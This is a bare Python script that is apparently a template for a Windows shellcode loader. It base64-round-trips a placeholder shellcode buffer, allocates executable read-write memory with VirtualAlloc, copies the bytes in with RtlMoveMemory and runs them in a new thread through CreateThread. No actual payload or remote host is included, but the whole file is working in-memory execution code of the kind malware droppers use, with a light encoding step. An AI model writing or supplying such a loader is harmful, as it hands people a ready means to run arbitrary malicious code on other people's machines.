import base64
import ctypes

buf = "Shellcode Here"

shellcode = buf.encode('latin-1')
shellcode = shellcode.decode('unicode_escape')

encoded_shellcode = base64.b64encode(bytes(shellcode, 'latin-1')).decode('ascii')

shellcode = base64.b64decode(encoded_shellcode)

payload_ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)
)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(payload_ptr), shellcode, ctypes.c_int(len(shellcode)))

rand_ht = ctypes.windll.kernel32.CreateThread(None, 0, ctypes.c_int(payload_ptr), None, 0, None)

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(rand_ht), ctypes.c_int(-1))
